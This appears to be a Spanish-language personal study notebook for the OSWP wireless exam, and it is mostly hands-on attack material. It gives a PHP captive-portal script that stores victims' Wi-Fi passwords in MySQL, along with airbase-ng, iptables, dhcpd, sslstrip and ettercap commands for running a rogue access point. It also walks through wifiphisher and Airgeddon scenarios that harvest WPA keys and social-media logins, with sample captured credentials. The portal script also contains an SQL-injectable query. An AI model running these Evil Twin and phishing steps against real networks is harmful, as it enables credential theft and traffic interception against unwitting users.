    ## .rw-r--r-- root root 138 B  Sun Aug 30 10:13:16 2015  upgrading.html
````

---

### Evil Twin: `Web Server & Captiva Portal Local Hosting`

1. **Instalar MySQL**

    - Esto es necesario para hostear el Web server del Captive Portal (**en realidad solo es necesario instalar `mariadb`**)
    - [MySQL Install error fix](https://stackoverflow.com/questions/20259036/mysql-package-mysql-server-has-no-installation-candidate)
 
````sh
sudo apt-get install mariadb-server
````

2. Habiliar `Apache Server` y `MySQL` para visualizar localhost /var/www/html

````sh
# 1. Habilitar Apache y MySQL
service apache2 start && service mysql start  

# 2. Ahora abrir un firefox (super+shift+f) y navegar a localhost
localhost

    # - Ahora ya se debe tener un portal con 2 campos de texto, pero marcan error si se ingresa cualquier cosa, es porque se necesita una DB MYSQL
    # - Esto se hace con el archivo dbconnect.php muy útil para editar en caso de que se quieran más datos en la DB o hacerlo mas custom ;) 
    # - HAcer un car dbconnect.php dice mas que mil palabras, en la parte superior está el nombre de la DB y las variables que se están guardando!!!!
````

- Ejemplo de estencil `dbconnect.php`

````php
// Fake Captive Portal Information Exfiltration :3 

// - Estas variables hacen queries hacia la DB en MySQL, es donde la víctima pondrá sus datos
// - Los datos de la víctima se guardarán en la Base de datos

<?php
session_start();
ob_start();
$host="localhost";
$username="fakeap";
$pass="fakeap";
$dbname="rogue_AP";
$tbl_name="wpa_keys";

// Create connection
$conn = mysqli_connect($host, $username, $pass, $dbname);
// Check connection
if (!$conn) {
    die("Connection failed: " . mysqli_connect_error());
}


$password1=$_POST['password1'];
$password2=$_POST['password2'];

$sql = "INSERT INTO wpa_keys (password1, password2) VALUES ('$password1', '$password2')";
if (mysqli_query($conn, $sql)) {
    echo "New record created successfully";
} else {
    echo "Error: " . $sql . "<br>" . mysqli_error($conn);
}

mysqli_close($conn);

sleep(2);
header("location:upgrading.html");
ob_end_flush();
?>
````

3. Crear `MySQL-Database`

- Las bases de la `Data Base` y `Variables` utilizadas
- Solo es necesario sacarlas del código

````php
# string con query completo:
$sql = "INSERT INTO wpa_keys (password1, password2) VALUES ('$password1', '$password2')";

# Nombre de Base de Datos     = rogue_AP
$dbname="rogue_AP";   

# Nombre de Tabla             = wpa_keys
$tbl_name="wpa_keys";

# Nombre de Campos            = password1 / password2
wpa_keys (password1, password2)
````

- Con variables `Database`, `Table` & `Data` se crea la `DB`

````sh
## [+] MySQL Database creation for Fake AP Evil Twin Attack by Fz3r0

## Inicializar mysql
mysql -uroot

# 1. Crear DB "rogue_AP"
create database rogue_AP;

# 2. Usar la base de datos y entrar
use rogue_AP;

# 3. Crear la Tabla "wpa_keys" con los campos "password1, password2" con su tipo de variable (texto es la opción asó captura lo que sea...)
create table wpa_keys(password1 varchar(32), password2 varchar(32));

# 4. Crear un user de la database y garantizarle todos los privilegios a la Base de Datos
create user fakeap@localhost identified by 'fakeap';

# 5. Asignarle todos los privilegios al user "fakeap"
grant all privileges on rogue_AP.* to 'fakeap'@'localhost';

# 666. Listo!!! Ahora ya está la prueba funcionar, se puede probar el portal directo e ingresar datos, validar con el buen select si se guardaron. Despúes ya solo es montar el Fake AP que tendrá este portal. 

    # En caso que en este punto no funcione bien y no cargue la página, salir y ejecutar lo siguiente en la carpeta /var/www/html:

sudo chmod +755 *
sudo apt install php-mysqli -y
sudo service apache2 restart    

# Ahora todo debe funcionar ;)

## =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

    ## Comandos de validación

# Entrar a database
use rogue_AP;

# Validaciones
show databases;
show tables;
describe wpa_keys;
# select GOD:
select * from wpa_keys;

# borrar datos:
delete from wpa_keys;

## =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

    ## Validar Funcionamiento de DB

# I. En la misma consola MariaDB de MySQL agregar datos con exactamente la misma query cambiando las variables: 
INSERT INTO wpa_keys (password1, password2) VALUES ('Fz3r0_test_user', 'Fz3r0_test_password');

# II. Verificar que se hayan ingresado los datos:
select * from wpa_keys;
````

### Evil Twin: Rogue Fake AP Mounting

- [IP Tables en Linux](https://www.acens.com/wp-content/images/2014/07/wp-acens-iptables.pdf)

````sh
## OJO!!! Recordar que si se usa VM debe estar en bridged para tener el mismo rango de subnet eue la PC base

## OJO!!! El adaptador ya debe estar en modo Monitor


# -e : ESSID "Fz3r0_air_PWN_Fake"
# -c : Channel, se debe usar el mismo que el AP original 
# -P : Este es un flag muy importante ya que RESPONDE A TODOS LOS PROBES ENVIADOS POR CLIENTES
#      - Esto quiere decir que mientras traten de conectar al AP original, se irán al Fake-AP que les mostrará el portal

# 1. Crear la Interfaz at0 para crear un "bridge" entre mi interfaz y la wlan0mon, usando la subnet actual

    # - OJO: Basarse en archivo /etc/dhcp/dhcpd.conf

#    # Show that we want to be the only DHCP server in this network:
#    authoritative;
#    # Lease Times
#    default-lease-time 3600;
#    max-lease-time 7200;
#    # Set up our desired subnet:
#    subnet 192.168.30.128 netmask 255.255.255.128 {   <<<----|| 1º Comando (at0 irá 1+ que esta IP)
#        option subnet-mask 255.255.255.128;                  || 2º Comando (usar exactamente la mimsa IP para ruta)
#        option broadcast-address 192.168.30.255;             || 2º Comando Se usará como GW el bridge del comando 1 (osea el +1)
#        option routers 192.168.30.129;
#        # Use Google public DNS server
#        option domain-name-servers 8.8.8.8, 8.8.4.4;
#        range 192.168.30.150 192.168.30.200;
#    }

### IMPORTANTE: In RHEL6 and derivatives, the dhcpd config file is now located at /etc/dhcp/dhcpd.conf, not /etc/dhcpd.conf. Moved the file and all is well. mv /etc/dhcpd.conf /etc/dhcp/dhcpd.conf 

# 1. IMPORTANTE PRIMERO MONTAR EL AP PARA CREAR LA at0!!!! duuh!!! 
#    Comando para montar el Fake AP
airbase-ng  -e Fz3r0_air_PWN_Fake -c 6 wlan0mon

# 2. Modificar la interfaz at0
ifconfig at0 192.168.1.129 netmask 255.255.255.128

# 2. Crear la ruta a la network (esta debe ser exactamente la misma IP que mi eth0 real:) [y el gw será +1]
route add -net 192.168.1.128 netmask 255.255.255.128 gw 192.168.1.129

# 3. Habilitar el enrutamiento en el equipo para que las reglas puedan funcionar
    # Aquí normalmente está en "0" como desactivado, al final hay que volverlo a poner en 0
echo 1 > /proc/sys/net/ipv4/ip_forward

    # Desactivar Ruta:
echo 0 > /proc/sys/net/ipv4/ip_forward

# 4. Validar con ifconfig la existencia de at0
ifconfig at0

## =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-

    ## Crear reglas para decidir que pasará con el cliente que se conecte al Fake AP

# 1. Borrar y hacer flush de todo iptables
iptables --flush; iptables --table nat --flush; iptables --delete-chain; iptables --table nat --delete-chain    

# 2. Verificar que no exista ninguna regla
iptables -S 
iptables -L

# 3. Aquí es donde se hará la ruta desde eth0 que es la salida a la WAN hacia la ath0 que es el Fake AP
#    * También se crean todas las políticas como las direcciones de los puertos (http 80 | https 443, 8080)
#    * Por ejemplo, cada que navegue por el puerto 80 sea redirigido al captive portal 
iptables --table nat --append POSTROUTING --out-interface eth0 -j MASQUERADE
  ´ 
# 4. Ahora se creará el Forward para nutrir al ath0
iptables --append FORWARD --in-interface at0 -j ACCEPT

# 5. Ahora se crea la politica para detectar el tráfico del puerto 80 y redirigir hacia el portal o destino que yo quiera
#    OJO! La autimatización del script es simplemente para sacar la IP de la interfaz eth0
iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination $(hostname -I | awk '{print $1}'):80

# 6. Ejecuto el comando de MASQUERADE
iptables -t nat -A POSTROUTING -j MASQUERADE

## =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-


https://security.stackexchange.com/questions/149490/setting-up-a-fake-ap-problem-with-iptables-and-dns-server

https://thecybersecurityman.com/2018/08/11/creating-an-evil-twin-or-fake-access-point-using-aircrack-ng-and-dnsmasq-part-2-the-attack/

#!/bin/sh
ifconfig at0 up
ifconfig at0 192.168.1.129 netmask 255.255.255.128
ifconfig at0 mtu 1400
echo 1 > /proc/sys/net/ipv4/ip_forward
iptables --flush
iptables --table nat --flush
iptables --delete-chain
iptables --table nat --delete-chain
iptables -P FORWARD ACCEPT
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE



    ## El ataque final, guárdame este fierrito

# 1. Navegar a la ruta del /etc/dhcpd.conf   
cd /etc/dhcp && ls | grep dhcpd 

# 2. Ejecutar el dhcpd 

    # -cf  - Asigna el archivo dhcpd.conf
    # -pf  - Archivo donde guardaré el PID
    # ath0 - La interfaz bridge del Fake AP

    # OJO! Puede que se tenga duplicado el archivo "var/run/dhcpd.pid" y haya que eliminarlo
rm var/run/dhcpd.pid

# Ejecutar el comando
dhcpd -cf /etc/dhcp/dhcpd.conf -pf /var/run/dhcpd.pid at0

# En caso que marque error donde falte el "dhcpd.leases" solo hay que crearlo
touch /var/lib/dhcp/dhcpd.leases


## PARA TENER INTERNET HAY QUE RECNECTAR LOS ADAPTADORES!!!
systemctl start NetworkManager.service


````

Revision de isc-dhcp server en caso de errores

`/etc/default/isc-dhcp-server`


para cargar https

sslstrip -f -p -k
ettercap -p -u -T -q -i at0

## `Evil Twin` @ `eviltrust`

- [Evil Trust](https://github.com/s4vitar/evilTrust)







---

<div align="center">

┌═════════════════════┐<br>
| [█ █ █   << BACK TO TOP >>   █ █ █](https://github.com/Fz3r0/Fz3r0_-_BlackShark/blob/main/OSWP/Hacia_el_infierno_del_OSWP.md#%EF%B8%8F-%C3%ADndice)                |<br>
└═════════════════════┘<br>

 </div> 

<br><br><br>

## Evil Twin con Airgeddon

### Instalación Airgeddon

````sh
## Prevenir perder internet al poner el adaptador en monitor:
## AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING from true to false and network manager will not be killed always to keep internet access on other wireless interfaces. Closing.

# Enabled true / Disabled false - Force to kill Network Manager before launching Evil Twin attacks - Default value true
# ctrl + f == AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING=false
subl /usr/share/airgeddon/.airgeddonrc






# 1. Ejecutar Airgeddon y dar enter para continuar (no es necesario tener en monitor, todo se hace desde Airgeddon)
airgeddon

# 2. Seleccionar la interfaz para trabajar como wlan0
2

# 3. Seleccionar el modo monitor para la interfaz
2

# 4. Seleccionar el tipo de ataque: Evil Twin (7)
7

# 5. Seleccionar ataque con Captive Portal (9)
9

# 6. En este momento se hará un scan de redes, se debe seleccionar la red para atacar (Airgeddon hará el clon automaticamente a diferencia del manual)
enter 
enter 
select_network(1)

# 7. Seleccionar tipo de ataque de deauth, el 1 es el mas comun
1


################## Solution

Ok, this is solved now. On v10.41 it will be able to work in both modes. Default will be network manager killing as before opening this issue. And for the OP and other people with similar problems, they'll can change the new option AIRGEDDON_FORCE_NETWORK_MANAGER_KILLING from true to false and network manager will not be killed always to keep internet access on other wireless interfaces. Closing.

/usr/share/airgeddon/.airgeddonrc

````

---

<div align="center">

┌═════════════════════┐<br>
| [█ █ █   << BACK TO TOP >>   █ █ █](https://github.com/Fz3r0/Fz3r0_-_BlackShark/blob/main/OSWP/Hacia_el_infierno_del_OSWP.md#%EF%B8%8F-%C3%ADndice)                |<br>
└═════════════════════┘<br>

 </div> 

<br><br><br>

## `Evil Twin` @ `wifiphisher`

### Ejemplos

- [Auditoria Wifi con WifiPhisher](https://www.youtube.com/watch?v=fGEB7dAga7E)

---

### `WifiPhisher`

- Instalación

````sh
apt install -y wifiphisher
````

### Importante

- Los ataques con `wifiphisher` necesitan `x2 adaptadores` para poder funcionar _(Uno hace `Packet Inyection` y el Otro hace `Deauth-Attack`)_

---

### `Ataque`: "Error de conexión" fake

- Aquí no es necesario dar Internet a la victima con `systemctl start NetworkManager.service` ya que le mandará un error de conexión falso en lo que se extraen sus credenciales
- **Este ataque necesita 2 adaptadores como mínimo**

````sh
# 1. Capturar Redes alrededor (Aquí debemos elegir al objetivo que vamos a clonar para el ataque)
wifiphisher

# 2. Seleccionar la red que usaremos para atacar y hacerle phishing "Fz3r0_Air_PWN" y hacer Enter

# 3. Seleccionar un escenario de Phishing:

    # Aquí se puede elegir el que se prefiera, en este caso usaré el phishing de credenciales de Social Networks (2)
        ## 2 - OAuth Login Page                                                                                                       
        ## A free Wi-Fi Service asking for Facebook credentials to authenticate using OAuth
        
# 4. Una vez seleccionado, automáticamente empezará el ataque:

    # +++ Aquí ya deberá aparecer el Evil Twin con el nombre del SSID seguido por un "2" ++++
    
    # - La víctima al der deautenticada de la red original se podría conectar al AP rougue o Evil Twin
    # - También podría caer otra víctima al ser una red abierta
    
    # +++ Una vez que la vñictima caiga y escriba sus credenciales se verá algo así desde la Máquina Atacante:
    #     (y en la pantalla de la victima se verá un error que lo están tratando de arreglar)

    # |                             
    # Extensions feed:                                                                             | Wifiphisher 1.4GIT          DEAUTH/DISAS - 24:11:45:37:8d:f0                                                             | # ESSID: Fz3r0_Air_PWN        
    # DEAUTH/DISAS - 0a:2b:11:03:eb:ee                                                             | Channel: 6                  DEAUTH/DISAS - 44:e5:17:06:e4:60                                                             | # AP interface: wlan1         
    # DEAUTH/DISAS - aa:13:96:83:76:9e                                                             | Options: [Esc] Quit         Victim 44:e5:17:6:e4:60 probed for WLAN with ESSID: 'Fz3r0_Air_PWN' (Evil Twin)              |_____________________________
    # Connected Victims:                                                                                                         44:e5:17:06:e4:60       10.0.0.57       Unknown Windows                                                                    
                                                                                                                           
    #  HTTP requests:                                                                                                             
    #  [*] GET request from 10.0.0.57 for http://detectportal.firefox.com/canonical.html                                          
    #  [*] GET request from 10.0.0.57 for http://detectportal.firefox.com/canonical.html                                          [*] GET request from 10.0.0.57 for http://www.msftconnecttest.com/connecttest.txt                                            
    #  [*] GET request from 10.0.0.57 for http://detectportal.firefox.com/canonical.html                                          [*] GET request from 10.0.0.57 for http://detectportal.firefox.com/canonical.html             
    
# 5. Salir de esa pantalla dando ESCAPE, se mostrará lo capturado que fue escrito por la víctima, por ejemplo:

    ## [+] Captured credentials:
    ## wfphshr-email=User_Fz3r0@mail.net&wfphshr-password=Sup3r_H4rd_p4ssw0rd_no_break_or?????     <<<------||| Booooom!!!! ;) 
    ## [!] Closing                                                                                  
````

---

### `Ataque`: "Caída de AP" fake

- Revisar que SI haya Internet en el atacante usando `systemctl start NetworkManager.service`.

````sh
# 1. Capturar Redes alrededor (Aquí debemos elegir al objetivo que vamos a clonar para el ataque)
wifiphisher

# 2. Seleccionar la red que usaremos para atacar y hacerle phishing "Fz3r0_Air_PWN" y hacer Enter

# 3. Seleccionar un escenario de Phishing:

    # Aquí se puede elegir el que se prefiera, en este caso usaré el phishing de credenciales de Network Manager Connect (4)
    
    # 4 - Network Manager Connect                                                                                                
    #     The idea is to imitate the behavior of the network manager by first showing the                                    
    #     browser's "Connection Failed" page and then displaying the victim's network manager window through the page                
    #     asking for the pre-shared key.
        
# 4. Una vez seleccionado, automáticamente empezará el ataque:

    # Extensions feed:                                                                             | Wifiphisher 1.4GIT          DEAUTH/DISAS - c8:94:02:b9:10:33                                                               #   | ESSID: Fz3r0_Air_PWN        
    # DEAUTH/DISAS - 56:6b:26:ed:c0:f3                                                             | Channel: 6                  Victim c8:94:2:b9:10:33 probed for WLAN with ESSID: '' (KARMA)                               | AP interface: wlan1         
    #                                                                                              | Options: [Esc] Quit                                                                                                      |_____________________________
    # Connected Victims:                                                                                                         c8:94:02:b9:10:33       10.0.0.26       Unknown Windows                                                                    
                      
    # HTTP requests:                                                                                                             
    # [*] GET request from 10.0.0.26 for http://pico.eset.com/pico/1/169155.pic                                                  
    # [*] GET request from 10.0.0.26 for http://www.msftconnecttest.com/connecttest.txt                                          [*] GET request from 10.0.0.26 for http://www.msftconnecttest.com/connecttest.txt                                          
    # [*] GET request from 10.0.0.26 for http://www.msftconnecttest.com/connecttest.txt                                          [*] GET request from 10.0.0.26 for http://ipv6.msftconnecttest.com/connecttest.txt 

# 5. Salir de esa pantalla dando ESCAPE, se mostrará lo capturado que fue escrito por la víctima, por ejemplo:

    ## [+] Captured credentials:
    ## wfphshr-wpa-password=passwoerd_mine_su3r_h4rd     <<<------||| Booooom!!!! ;)
    ## [!] Closing                                                                                      
````

---

### `Ataque`: Phishing & Ingeniería Social

- Revisar que SI haya Internet en el atacante usando `systemctl start NetworkManager.service`.

**Es necesario descargar la plantilla deseada de: https://github.com/wifiphisher**

1. Específicamente se debe usar el repositorio de: https://github.com/wifiphisher/extra-phishing-pages
2. Descargar todo ese repositorio clonando por completo (para tener todas las plantillas) 
````sh
`git clone https://github.com/wifiphisher/extra-phishing-pages.git && cd extra-phishing-pages`
````
4. copiar lo descargado a: `/usr/lib/python3/dist-packages/wifiphisher/data/phishing-pages`
````sh
cp -r /home/fz3r0/Documents/CWAP/extra-phishing-pages/* /usr/lib/python3/dist-packages/wifiphisher/data/phishing-pages/
````
5. `Modo Automático`: **Ahora solo es necesario hacer el ataque como en cualquiera de los anteriores, simplemente se agregarán los nuevos escenarios y URLS** 

---

### `Ataque` Phishing & Ingeniería Social - Redes Sociales: `Manual`

- Esto sirve para que el `AP` y el `SSID` se llame de cualquier manera _(sin necesidad de clonar un `SSID`)_ y al final redirigir a la víctima un `malicious captive portal`
- Revisar que SI haya Internet en el atacante usando `systemctl start NetworkManager.service`.

````sh
# 1. Lanzar wifiphisher con flag -e para incluír el SSID y -p para seleccionar el portal
    # Importante! -kN se usa para no parar el proceso que deja sin Internet
wifiphisher -e "Fz3r0-Free-Internet" -p instagram-login -kN

# 2. Una vez seleccionado, automáticamente empezará el ataque:

#                                                                                                                  |                             
# Extensions feed:                                                                                                 | Wifiphisher 1.4GIT          
# DEAUTH/DISAS - 5c:aa:fd:12:70:0f                                                                                 | ESSID: Fz3r0-Free-Internet  
# DEAUTH/DISAS - 30:45:96:d7:f2:3e                                                                                 | Channel: 6                  
# DEAUTH/DISAS - da:a1:19:48:5b:2d                                                                                 | AP interface: wlan1         
# DEAUTH/DISAS - a0:bd:1d:03:54:c4                                                                                 | Options: [Esc] Quit         
# Victim 44:e5:17:6:e4:60 probed for WLAN with ESSID: 'Fz3r0-Free-Internet' (Evil Twin)                            |_____________________________
# Connected Victims:                                                                                                                             
# 44:e5:17:06:e4:60       10.0.0.57       Unknown Windows                                                                                        
#                                                                                                                                                
# HTTP requests:                                                                                                                                 
# [*] GET request from 10.0.0.57 for http://detectportal.firefox.com/canonical.html                                                              
# [*] GET request from 10.0.0.57 for http://detectportal.firefox.com/canonical.html                                                              
# [*] GET request from 10.0.0.57 for http://detectportal.firefox.com/canonical.html                                                              
# [*] GET request from 10.0.0.57 for http://detectportal.firefox.com/canonical.html                                                              
# [*] GET request from 10.0.0.57 for http://detectportal.firefox.com/canonical.html

# 5. Salir de esa pantalla dando ESCAPE, se mostrará lo capturado que fue escrito por la víctima, por ejemplo:

    ## [+] Captured credentials:
    ## wfphshremail=Fz3r0@email.net&wfphshrpassword=P4$$w0rdSup3rHard_?!wawa     <<<------||| Booooom!!!! ;)
    ## [!] Closing    
````

---

<div align="center">

┌═════════════════════┐<br>
| [█ █ █   << BACK TO TOP >>   █ █ █](https://github.com/Fz3r0/Fz3r0_-_BlackShark/blob/main/OSWP/Hacia_el_infierno_del_OSWP.md#%EF%B8%8F-%C3%ADndice)                |<br>
└═════════════════════┘<br>

 </div> 

<br><br><br>

## `Evil Twin` @ `wifipumpkin3`

### Recursos

- [Web Oficial y Tutoriales](https://wifipumpkin3.github.io/docs/getting-started#installation)

### Instalación

- 













## Descubrir SSID oculto

- [Obteniendo nombre de red wifi oculta (AndyHM)](https://www.youtube.com/watch?v=aaKTtROzR8E)


1. Capturar PCAP y buscar un ccliente que haga probe request hacia el AP con SSID oculto, ahí viajará el SSID en texto plano

````sh

````
















## Descubrir SSID oculto

- [Obteniendo nombre de red wifi oculta (AndyHM)](https://www.youtube.com/watch?v=aaKTtROzR8E)


1. Capturar PCAP y buscar un ccliente que haga probe request hacia el AP con SSID oculto, ahí viajará el SSID en texto plano

````sh

````

























## WPS Attacks

- [Rompiendo redes Inalámbricas WPA y WPA2 con WPS en segundos](https://www.dragonjar.org/rompiendo-redes-inalambricas-wpa-y-wpa2-con-wps-en-segundos.xhtml)


- WPSPin



https://gist.github.com/s4vitar/3b42532d7d78bafc824fb28a95c8a5eb



## DSTIKE deauther reloj































no retry ethernet

!(dns.retransmission == 1  || tcp.analysis.retransmission) 

ningun error, duplicado, etc. 

!(tcp.analysis.flags && !tcp.analysis.window_update && !tcp.analysis.keep_alive && !tcp.analysis.keep_alive_ack) && !(dns.retransmission == 1  || tcp.analysis.retransmission) 

no ipv6 

!ipv6.version == 6

solo ipv4

ip.version == 4

mdns ipv4 sin retry

!(tcp.analysis.flags && !tcp.analysis.window_update && !tcp.analysis.keep_alive && !tcp.analysis.keep_alive_ack) && !(dns.retransmission == 1  || tcp.analysis.retransmission) && mdns && ip.version == 4

































## Cyber-Weapons & Tools

- `aircrack-ng Suite` - Suite Auditoría WiFi y Pentesting 802.11

- `pyrit` - (legacy) WEP Attacks y más ataques 802.11 https://laguialinux.es/pyrit-descifrar-clave-wpa-con-gpu/

- `macchanger` - MAC Spoofing

- `ghex` - Editor Hexadecimal

- `TCP Replay` - Inyecta frames a la red

- `mdk3` - Usado para Beacon Flood Mode y más ataques 802.11


## Aircrack NG Cheatsheets

- https://yisux.wordpress.com/2009/03/11/aircrack-ng-comandos-basicos-para-ataques-con-clientes-asociados/    


## Instalación, compilación y validación del HandShake con Pyrit














## Recursos

### Cursos y Data


- https://gist.github.com/s4vitar/3b42532d7d78bafc824fb28a95c8a5eb?permalink_comment_id=3690188#configuraci%C3%B3n-de-la-tarjeta-de-red-y-tips
- https://www.youtube.com/watch?v=ekDHoW14Rb4
- https://www.mastermind.ac/courses/take/hacking-de-redes-inalambricas-wifi/lessons/18126307-bienvenid-al-curso
- https://help.offensive-security.com/hc/en-us/articles/360046904731-OSWP-Exam-Guide
- https://tryhackme.com/room/wifihacking101

### Aircrack NG

- https://www.aircrack-ng.org/


### Modo Monitor

- https://hromero99.github.io/Seguridad-en-redes-dom-sticas/crackingWifi/


24:11:45:37:8d:f0

- nuevas versiones pedos:

https://www.reddit.com/r/Kalilinux/comments/nm14i5/my_wlan0_doesnt_change_to_wlan0mon_but_it_shows/




---

la repsuesta  alos problemas?

- https://www.youtube.com/watch?v=EJa_2I84Q3c

- https://store.rokland.com/pages/usb-wifi-adapters

- https://store.rokland.com/pages/alfa-awus-1900-driver-and-support

- monitor mode script:

- https://store.rokland.com/pages/alfa-wireless-adapters-monitor-mode-help-linux

- `wget http://rokland.com/support/linux/start-mon.sh`

- `bash ./start-mon.sh wlan0mon`



https://linuxhint.com/monitor_mode_kali_linux/















































## WiFi co Hashcat PMKID

### Recursos

- [New attack on WPA/WPA2 using PMKID](https://hashcat.net/forum/thread-7717.html)
- [Cracking WPA/WPA2 with hashcat](https://hashcat.net/wiki/doku.php?id=cracking_wpawpa2)

### Obtener PMKID



































###

- (S4vitar OSWP preparación)[ttps://s4vitar.github.io/oswp-preparacion/#]
